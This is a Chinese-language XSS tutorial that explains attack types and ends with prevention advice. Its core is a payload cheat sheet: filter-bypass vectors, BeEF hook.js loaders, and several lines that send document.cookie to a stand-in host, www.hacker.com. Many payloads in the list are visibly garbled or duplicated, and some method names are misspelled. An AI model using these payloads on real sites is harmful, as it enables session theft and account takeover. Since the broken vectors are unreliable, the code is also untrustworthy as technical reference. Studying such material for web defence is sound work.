- [这一次，彻底理解XSS攻击](https://www.cnblogs.com/zhaohongcheng/p/14214799.html)
- [一文掌握XSS](https://www.cnblogs.com/jeromeyoung/p/14221606.html)



跨站脚本攻击XSS：（Cross Site Scripting）	

# 一、XSS简介
跨站脚本（cross site script）为了避免与css混淆，所以简称为XSS。

XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。

XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

## 1.1 XSS攻击的危害包括
 1. 盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号。
 2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。
 3. 盗窃企业重要的具有商业价值的材料。
 4. 非法转账。
 5. 强制发送电子邮件，
 6. 网站挂马。
 7. 控制受害者机器向其他网站发起攻击。

## 1.2 XSS原理解析及类型
XSS主要原因：
过于信息客户端提交的数据！

### 1.2.1 反射型（非持久型）XSS
![](https://www.showdoc.cc/server/api/common/visitfile/sign/794b8ab40f61a12d9f0c08e2dca6ba66?showdoc=.jpg)

XSS主要分类：
反射型xss攻击（Reflected XSS）又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接（即每次攻击需要用户的点击）。



反射型XSS只是简单的把用户输入的数据从服务器反射给用户浏览器，要利用这个漏洞，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。

举例来说，当一个网站的代码中包含类似下面的语句:

```php
<?php echo "<p>hello,$_GET['user']</p>"; ?>
```

如果未做防范XSS，用户名设为`<script>alert("Tz")</script>`,则会执行预设好的JavaScript代码。

#### 漏洞成因

当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：

- 将不可信数据插入到HTML标签之间时；// 例如div, p, td；
- 将不可信数据插入到HTML属性里时；// 例如：`<div width=$INPUT></div>`
- 将不可信数据插入到SCRIPT里时；// 例如：`<script>var message = ” $INPUT “;</script>`
- 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如`<span style=” property : $INPUT ”></span>`
- 将不可信数据插入到HTML URL里时，// 例如：`<a href=”[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT ”></a>`
- 使用富文本时，没有使用XSS规则引擎进行编码过滤。

**对于以上的几个场景，若服务端或者前端没有做好防范措施，就会出现漏洞隐患。**

#### 攻击流程

反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大，所以它的危害性较存储型要小。

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b53bf56086cd48988872c80c6db8f5ba~tplv-k3u1fbpfcp-zoom-1.image)



### 1.2.2 存储型（持久型）XSS
存储型XSS（Stored XSS）又称为持久型跨站点脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将自动执行。

存储型XSS（持久型XSS）即攻击者将带有XSS攻击的链接放在网页的某个页面，例如评论框等；用户访问此XSS链接并执行，由于存储型XSS能够攻击所有访问此页面的用户，所以危害非常大。

存储型（或 HTML 注入型/持久型）XSS 攻击最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来执行。黑客仅仅需要提交 XSS 漏洞利用代码（反射型XSS通常只在url中）到一个网站上其他用户可能访问的地方。这些地区可能是`博客评论，用户评论，留言板，聊天室，HTML 电子邮件，wikis`，和其他的许多地方。一旦用户访问受感染的页，执行是自动的。



#### 漏洞成因

​	存储型XSS漏洞的成因与反射型的根源类似，不同的是恶意代码会被保存在服务器中，导致其它用户（前端）和管理员（前后端）在访问资源时执行了恶意代码，用户访问服务器-跨站链接-返回跨站代码。

#### 攻击流程

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43b345fe21ab461b83c59dd304499851~tplv-k3u1fbpfcp-zoom-1.image)



### 1.2.3 DOM型XSS

通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。

#### 漏洞成因

DOM型XSS是基于DOM文档对象模型的。对于浏览器来说，DOM文档就是一份XML文档，当有了这个标准的技术之后，通过JavaScript就可以轻松的访问DOM。当确认客户端代码中有DOM型XSS漏洞时，诱使(钓鱼)一名用户访问自己构造的URL，利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。

#### 攻击示例

```html
<html>
    <head>
        <title>DOM Based XSS Demo</title>
        <script>
        function xsstest()
        {
        var str = document.getElementById("input").value;
        document.getElementById("output").innerHTML = "<img
        src='"+str+"'></img>";
        }
        </script>
    </head>
    <body>
    <div id="output"></div>
    <input type="text" id="input" size=50 value="" />
    <input type="button" value="submit" onclick="xsstest()" />
    </body>
</html>
```

在这段代码中，submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了DOM Based XSS。

### 1.2.4 通用型XSS

通用型XSS，也叫做UXSS或者Universal XSS，全称Universal Cross-Site Scripting。

上面三种XSS攻击的是因为客户端或服务端的代码开发不严谨等问题而存在漏洞的目标网站或者应用程序。这些攻击的先决条件是访问页面存在漏洞，但是UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。

#### 漏洞成因

Web浏览器是正在使用的最流行的应用程序之一，当一个新漏洞被发现的时候，不管自己利用还是说报告给官方，而这个过程中都有一段不小的时间，这一过程中漏洞都可能被利用于UXSS。

不仅是浏览器本身的漏洞，现在主流浏览器都支持扩展程序的安装，而众多的浏览器扩展程序可能导致带来更多的漏洞和安全问题。因为UXSS攻击不需要网站页面本身存在漏洞，同时可能访问其他安全无漏洞页面，使得UXSS成为XSS里危险和最具破坏性的攻击类型之一。

#### 漏洞案例

##### IE6或火狐浏览器扩展程序Adobe Acrobat的漏洞

这是一个比较经典的例子。当使用扩展程序时导致错误，使得代码可以执行。这是一个在pdf阅读器中的bug，允许攻击者在客户端执行脚本。构造恶意页面，写入恶意脚本，并利用扩展程序打开pdf时运行代码。tefano Di Paola 和 Giorgio Fedon在一个在Mozilla Firefox浏览器Adobe  Reader的插件中可利用的缺陷中第一个记录和描述的UXSS，Adobe插件通过一系列参数允许从外部数据源取数据进行文档表单的填充，如果没有正确的执行，将允许跨站脚本攻击。

案例详见: Acrobat插件中的UXSS报告

##### Flash Player UXSS 漏洞 – CVE-2011-2107

一个在2011年Flash  Player插件（当时的所有版本）中的缺陷使得攻击者通过使用构造的.swf文件，可以访问Gmail设置和添加转发地址。因此攻击者可以收到任意一个被攻破的Gmail帐号的所有邮件副本（发送的时候都会抄送份）。Adobe承认了该漏洞.

案例详见: Flash Player UXSS 漏洞 – CVE-2011-2107报告

移动设备也不例外，而且可以成为XSS攻击的目标。Chrome安卓版存在一个漏洞，允许攻击者将恶意代码注入到Chrome通过Intent对象加载的任意的web页面。

##### 安卓版Chrome浏览器漏洞

案例详见: Issue 144813: Security: UXSS via com.android.browser.application_id Intent extra



### 1.2.5 突变型XSS

突变型XSS，也叫做mXSS或，全称Mutation-based Cross-Site-Scripting。（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation）

#### 漏洞成因

然而，如果用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得这个认定不再成立：浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。

随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进入innerHTML后发生意外变化，而最终导致XSS的攻击流程。

#### 攻击流程

​	将拼接的内容置于innerHTML这种操作，在现在的WEB应用代码中十分常见，常见的WEB应用中很多都使用了innerHTML属性，这将会导致潜在的mXSS攻击。从浏览器角度来讲，mXSS对三大主流浏览器（IE，CHROME，FIREFOX）均有影响。

#### mXSS种类

目前为止已知的mXSS种类，接下来的部分将分别对这几类进行讨论与说明。

- 反引号打破属性边界导致的 mXSS；（该类型是最早被发现并利用的一类mXSS，于2007年被提出，随后被有效的修复）
- 未知元素中的xmlns属性所导致的mXSS；（一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。）
- CSS中反斜线转义导致的mXSS；（在CSS中，允许用\来对字符进行转义，例如：`property: 'v\61 lue'` 表示 `property:'value'`，其中61是字母a的ascii码（16进制）。\后也可以接unicode，例如：\20AC 表示 € 。正常情况下，这种转义不会有问题。但是碰上innerHTML后，一些奇妙的事情就会发生。）
- CSS中双引号实体或转义导致的mXSS；（接着上一部分，依然是CSS中所存在的问题，`"`  `"` `"` 等双引号的表示形式均可导致这类问题，）
- CSS属性名中的转义所导致的mXSS；
- 非HTML文档中的实体突变；
- HTML文档中的非HTML上下文的实体突变；

# 二、构造XSS脚本
## 2.1 常用HTML标签
```
<iframe>  iframe元素会创建包含另外一个文档的内联框架（即行内框架）。
<textarea>  <textarea>标签定义多行的文本输入控件。
<img>    img元素向网页中嵌入一幅图像。
<script>  <script>标签用于定义客户端脚本，比如JavaScript。script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件。必须的type属性规定脚本的MIME类型。JavaScript的常见应用时图像操作、表单验证以及动态内容更新。
```

## 2.2 常用JavaScript方法
```
alert   alert()方法用于显示带有一条指定消息和一个确认按钮的警告框。
window.location   window.location对象用于获得当前页面的地址（URL），并把浏览器重定向到新的页面。
Llcation.href   返回当前显示的文档的完整URL
lnload   一张页面或一幅图像完成加载。
lnsubmit   确认按钮被点击。
lnerror   在加载文档或图像时发生错误。
```

## 2.3 构造XSS脚本
### 2.3.1 弹窗警告
此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号’，一旦次脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<>/’，这样就可以证明，这个页面位置存在了XSS漏洞。
```Javascript
<script>alert(‘xss’)</script>
<script>alert(document.cookie)</script>
```
### 2.3.2 页面嵌套
```html
<iframe src=http://www.baidu.com width=300 height=300></iframe>
<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>
```
### 2.3.3 页面重定向
```Javascript
<script>window.location=”http://www.baidu.com”</script>
<script>location.href=”http://www.baidu.com”</script>
```
### 2.3.4 弹框警告并重定向
```Javascript
<script>alert(“请进入新的网站”);location.href=”http://www.baidu.com”</script>
<script>alert(‘xss’);location.href=”http://10.1.1.2/mul/test.txt”</script>
// 通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户（克隆网站收集账户）。
```
### 2.3.4 访问恶意代码
```Javascript
<script src=”http://www.baidu.com/xss.js”></script>
<script src=”http://BeEF_IP:3000/hook.js”></script>
// 结合BeEF收集用户的cookie
```

### 2.3.5 巧用图片标签
```html
<img src=”#” onerror=alert(‘xss’)>
<img src=”javascript:alert(‘xss’);”>
<img src=”http://BeEF_IP:3000/hook.js”></img>
```
### 2.3.5 绕开过滤的脚本
```html
// 大小写<ScrIpt>alert(‘xss’)</SCRipt>
// 字符编码 采用URL、Base64等编码
<a href=”&#106,&#97;”>test</a>
```
### 2.3.6 收集用户cookie
```Javascript
// 打开新窗口并且采用本地cookie访问目标网页。
<script>window.open(“http://www.hacker.com/cookie.php?cookie=”+document.cookie)</script>
<script>document.location(“http://www.hacker.com/cookie.php?cookie=”+document.cookie)</script>
<script>new Image.src=”http://www.hacker.com/cookie.php?cookie=”+document.cookie;</script>
<img src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”></img>
<iframe src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”></iframe>
<script>new Image.src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”;img.width=0;img.height=0;</script>
```
## 2.4 XSS攻击代码出现的场景

- **普通的XSS JavaScript注入**，示例如下：

  ```
  <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
  ```

- **IMG标签XSS使用JavaScript命令**，示例如下：

  ```
  <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
  ```

- **IMG标签无分号无引号**，示例如下：

  ```
  <IMG SRC=javascript:alert(‘XSS’)>
  ```

- **IMG标签大小写不敏感**，示例如下：

  ```
  <IMG SRC=JaVaScRiPt:alert(‘XSS’)>
  ```

- **HTML编码(必须有分号)**，示例如下：

  ```
  <IMG SRC=javascript:alert(“XSS”)>
  ```

- **修正缺陷IMG标签**，示例如下：

  ```
  <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
  ```

- **formCharCode标签**，示例如下：

  ```
  <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
  ```

- **UTF-8的Unicode编码**，示例如下：

  ```
  <IMG SRC=jav..省略..S')>
  ```

- **7位的UTF-8的Unicode编码是没有分号的**，示例如下：

  ```
  <IMG SRC=jav..省略..S')>
  ```

- **十六进制编码也是没有分号**，示例如下：

  ```
  <IMG SRC=\'#\'" /span>
  ```

- **嵌入式标签,将Javascript分开**，示例如下：

  ```
  <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
  ```

- **嵌入式编码标签,将Javascript分开**，示例如下：

  ```
  <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
  ```

- **嵌入式换行符**，示例如下：

  ```
  <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
  ```

- **嵌入式回车**，示例如下：

  ```
  <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
  ```

- **嵌入式多行注入JavaScript,这是XSS极端的例子**，示例如下：

  ```
  <IMG SRC=\'#\'" /span>
  ```

- **解决限制字符(要求同页面)**，示例如下：

  ```javascript
        <script>z=z+ ’write(“‘</script>
  
        <script>z=z+ ’<script’</script>
  
        <script>z=z+ ’ src=ht’</script>
  
        <script>z=z+ ’tp://ww’</script>
  
        <script>z=z+ ’w.shell’</script>
  
        <script>z=z+ ’.net/1.’</script>
  
        <script>z=z+ ’js></sc’</script>
  
        <script>z=z+ ’ript>”)’</script>
  
        <script>eval_r(z)</script>
  ```

- **空字符**，示例如下：

  ```
        perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
  ```

- **空字符2,空字符在国内基本没效果.因为没有地方可以利用**，示例如下：

  ```
        perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
  ```

- **Spaces和meta前的IMG标签**，示例如下：

  ```
  <IMG SRC=\'#\'"  
  
  javascript:alert(‘XSS’);”>
  ```

- **Non-alpha-non-digit XSS**，示例如下：

  ```
  <SCRIPT/XSS SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
  ```

- **Non-alpha-non-digit XSS to 2**，示例如下：

  ```
  <BODY onload!#$%&()*~+ -_.,:;?@[/|\]^`=alert(“XSS”)>
  ```

- **Non-alpha-non-digit XSS to 3**，示例如下：

  ```
  <SCRIPT/SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
  ```

- **双开括号**，示例如下：

  ```
  <<SCRIPT>alert(“XSS”);//<</SCRIPT>
  ```

- **无结束脚本标记(仅火狐等浏览器)**，示例如下：

  ```
  <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
  ```

- **无结束脚本标记2**，示例如下：

  ```
  <SCRIPT SRC=//3w.org/XSS/xss.js>
  ```

- **半开的HTML/JavaScript XSS**，示例如下：

  ```
  <IMG SRC=\'#\'" /span>
  ```

- **双开角括号**，示例如下：

  ```
  <iframe src=http://3w.org/XSS.html <
  ```

- **无单引号 双引号 分号**，示例如下：

  ```
  <SCRIPT>a=/XSS/
  alert(a.source)</SCRIPT>
  ```

- **换码过滤的JavaScript**，示例如下：

  ```
    \”;alert(‘XSS’);//
  ```

- **结束Title标签**，示例如下：

  ```
  </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
  ```

- **Input Image**，示例如下：

  ```
  <INPUT SRC=\'#\'" /span>
  ```

- **BODY Image**，示例如下：

  ```
  <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
  ```

- **BODY标签**，示例如下：

  ```
  <BODY(‘XSS’)>
  ```

- **IMG Dynsrc**，示例如下：

  ```
  <IMG DYNSRC=\'#\'" /span>
  ```

- **IMG Lowsrc**，示例如下：

  ```
  <IMG LOWSRC=\'#\'" /span>
  ```

- **BGSOUND**，示例如下：

  ```
  <BGSOUND SRC=\'#\'" /span>
  ```

- **STYLE sheet**，示例如下：

  ```
  <LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>
  ```

- **远程样式表**，示例如下：

  ```
  <LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>
  ```

- **List-style-image(列表式)**，示例如下：

  ```
  <STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS
  ```

- **IMG VBscript**，示例如下：

  ```
  <IMG SRC=\'#\'" /STYLE><UL><LI>XSS
  ```

- **META链接url**，示例如下：

  ```
  <META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>
  ```

- **Iframe**，示例如下：

  ```
  <IFRAME SRC=\'#\'" /IFRAME>
  ```

- **Frame**，示例如下：

  ```
  <FRAMESET><FRAME SRC=\'#\'" /FRAMESET>
  ```

- **Table**，示例如下：

  ```
  <TABLE BACKGROUND=”javascript:alert(‘XSS’)”>
  ```

- **TD**，示例如下：

  ```
  <TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>
  ```

- **DIV background-image**，示例如下：

  ```
  <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
  ```

- **DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)**，示例如下：

  ```
  <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
  ```

- **DIV expression**，示例如下：

  ```
  <DIV STYLE=”width: expression_r(alert(‘XSS’));”>
  ```

- **STYLE属性分拆表达**，示例如下：

  ```
  <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
  ```

- **匿名STYLE(组成:开角号和一个字母开头)**，示例如下：

  ```
  <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
  ```

- **STYLE background-image**，示例如下：

  ```
  <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A CLASS=XSS></A>
  ```

- **IMG STYLE方式**，示例如下：

  ```
    exppression(alert(“XSS”))’>
  ```

- **STYLE background**，示例如下：

  ```
  <STYLE><STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>
  ```

- **BASE**，示例如下：

  ```
  <BASE HREF=”javascript:alert(‘XSS’);//”>
  ```



# 三、自动化XSS

## 3.1 BeEF简介
Browser Exploitation Framework（BeEF）
BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配置JS脚本和Metasploit进行渗透；BeEF是基于Ruby语言编写的，支持图形化界面，操作简单。
官方网站：http://beefproject.com/

## 3.2 信息收集
 1. 网络发现
 2. 主机信息
 3. Cookie获取
 4. 会话劫持
 5. 键盘记录
 6. 插件信息

## 3.3 持久化控制
 1. 确认弹框
 2. 小窗口
 3. 中间人

## 3.4 社会工程
 1. 点击劫持
 2. 弹窗告警
 3. 虚假页面
 4. 钓鱼页面

## 3.5 渗透攻击
 1. 内网渗透
 2. Metasploit
 3. CSRF攻击
 4. DDOS攻击

## 3.6 BeEF基础
![](https://www.showdoc.cc/server/api/common/visitfile/sign/0d83a34978091793bc4484c046116801?showdoc=.jpg)

命令颜色(color)：
 - 绿色：对目标主机生效并且不可见（不会被发现）
 - 橙色：对目标主机生效但可能可见（可能被发现）
 - 灰色：对目标主机未必生效（可验证下）
 - 红色：对目标主机不生效

# 四、XSS 攻击的预防

网上防范XSS攻击的方法一搜就一大堆，但是无论方法有多少，始终是万变不离其宗。

**XSS 攻击有两大要素： 1. 攻击者提交恶意代码。 2. 浏览器执行恶意代码。**

## 1.预防 DOM 型 XSS 攻击

DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用 `.innerHTML、.outerHTML、document.write() `时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用` .textContent、.setAttribute()` 等。

DOM 中的内联事件监听器，如 `location、onclick、onerror、onload、onmouseover `等， 标签的`href`属性，JavaScript 的`eval()、setTimeout()、setInterval()`等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易 产生安全隐患，请务必避免。

## 2.输入过滤

如果由前端过滤输入，然后提交到后端的话。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。

那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？ 我们举一个例子，一个正常的用户输入了 5 < 7 这个内容，在写入数据库前，被转义，变成了 5 `$lt;` 7。 问题是：在提交阶段，我们并不确定内容要输出到哪里。

这里的“并不确定内容要输出到哪里”有两层含义：

1. 用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 `$lt;`7 )。
2. 在前端中，不同的位置所需的编码也不同。 当 5 `$lt;`7  作为 HTML 拼接页面时，可以正常显示：`5 < 7`

所以输入过滤非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS，可采用下面的两种方法

## 3.前端渲染把代码和数据分隔开

在前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式 （.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。

- Javascript：可以使用textContent或者innerText的地方，尽量不使用innerHTML；
- query：可以使用text()得地方，尽量不使用html()；

## 4.拼接HTML时对其进行转义

如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。

常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 & < > " ' / 这几个字符转义掉，确 实能起到一定的 XSS 防护作用，但并不完善：

这里推荐一个前端防止XSS攻击的插件: js-xss，Git 3.8K 的Star和60W的周下载量证明了其强大性.